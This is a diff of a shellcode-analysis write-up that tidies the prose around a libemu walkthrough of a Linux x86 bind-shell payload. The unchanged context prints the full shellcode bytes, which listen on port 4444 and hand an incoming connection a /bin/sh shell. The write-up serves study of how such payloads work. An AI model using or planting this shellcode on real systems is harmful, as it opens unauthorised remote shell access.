@@ -38,8 +38,9 @@ unsigned char buf[] =
 2. [ndisasm - chmod](#chmod)
 
 ### Shell_Bind_TCP
-We have our shellcode printed out, now let's run it and check the output.  libemu is such a great tool and really makes the analysis much easier.  We get to see the instructions stepped through with the status of the registers and then the syscalls are all listed out with their arguments at the end.\
-WARNING: there will be a lot of output.. don't worry, it will all make sense once you understand the format.
+We have our shellcode printed out, now let's run it and check the output.  libemu is such a great tool and really makes the analysis much easier.  We get to see the instructions stepped through with the status of the registers.  At the end of the output, the syscalls are all listed out with their arguments.
+
+WARNING: there will be a lot of output.. hopefully it will all make sense once you understand the format.
 ```
 python -c "print '\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'" | sctest -vvv -Ss 100000
 verbose = 3
@@ -750,7 +751,15 @@ To explain the format for all the text here.. Let's take a look at one instructi
 [emu 0x0x9046480 debug ] Flags: PF ZF 
 [emu 0x0x9046480 debug ] 43                              inc ebx
 ```
-Each instruction includes a view of the current state during that instruction's execution.  The first line for this instruction shows the address of the instruction pointer.  The next 2 lines are the values in each of the registers for easier understanding of what is being done during the instruction.  The 4th line shows any flags that are set.  In this instance, we can see that the Parity Flag and the Zero flag are both set.  The last line is the instruction itself, so we can expect ebx to be 0x1 after inc ebx is executed.
+Each instruction includes a view of the current state during that instruction's execution.  
+
+The first line for this instruction shows the address of the instruction pointer.  
+
+The next 2 lines are the values in each of the registers for an easier understanding of what is being done.  
+
+The 4th line shows any flags that are currently set.  In this instance, we can see that the Parity Flag and the Zero flag are both set.  
+
+The last line is the instruction itself, so we can expect ebx to be 0x1 after inc ebx is executed.
 
 Let's start with the end of the output where our syscalls are all listed out.  Since we would usually look into each syscall while stepping through to get a high level idea of what is happening.. this feature is perfect for us.
 
@@ -762,9 +771,7 @@ int socket (
      int protocol = 0;
 ) =  14;
 ```
-We can see that a socket is made with the arguments and their values listed.\
-domain and type are both constants which translate to domain=AF_INET and type=SOCK_STREAM.\
-The return value is 14 which will be our file descriptor.
+We can see that a socket is made with the arguments and their values listed.  domain and type are both constants which translate to domain=AF_INET and type=SOCK_STREAM.  The return value is 14 which will be our file descriptor.
 
 Next call is:
 ```
@@ -782,7 +789,7 @@ int bind (
      int addrlen = 16;
 ) =  0;
 ```
-This call shows us that the file descriptor (14) is used in this bind call.  So we are binding the newly made socket to addr 0.0.0.0:4444, which is any address with port 4444.\
+This call shows us that the file descriptor (14) is used in this bind call.  So, we are binding the newly made socket to addr 0.0.0.0:4444, which is any address with port 4444.
 
 Next call:
 ```
@@ -791,7 +798,7 @@ int listen (
      int backlog = 0;
 ) =  0;
 ```
-We are setting our socket (file descriptor 14) to listen for any incoming connections to where we bound our socket (0.0.0.0:4444).\
+We are setting our socket (file descriptor 14) to listen for any incoming connections to where we bound our socket (0.0.0.0:4444).
 
 Next call:
 ```
@@ -803,9 +810,9 @@ int accept (
          none;
 ) =  19;
 ```
-We are accepting the incoming connection to our socket (file descriptor 14).\
+We are accepting the incoming connection to our socket (file descriptor 14).
 
-There are many calls to dup2 repeated, as we know.. dup2 will redirect various inputs/outputs to where you want them to go.  With what we already know, the inputs/outputs are being redirected so that the inputs/outputs will be passed through our socket.\
+There are many calls to dup2 repeated.  dup2 will redirect various inputs/outputs to where you want them to go.  If you've read through the Shell Bind TCP and Shell Reverse TCP posts, we used the same call to redirect input/output to our shells.  With that said, we can see that the inputs/outputs are being redirected through our socket.
 
 Final call:
 ```
@@ -823,7 +830,7 @@ int execve (
          none;
 ) =  0;
 ```
-We see the call to execve with the filename "/bin//sh", and arg "/bin//sh".  So we are executing a shell for the accepted connection.
+We see the call to execve with the filename "/bin//sh", and arg "/bin//sh".  We are executing a shell for the accepted connection.
 
 So, as we can tell from this quick analysis all done by libemu, we have a socket that accepts a connection and gives it a shell which confirms we have a working bind shell payload.
 
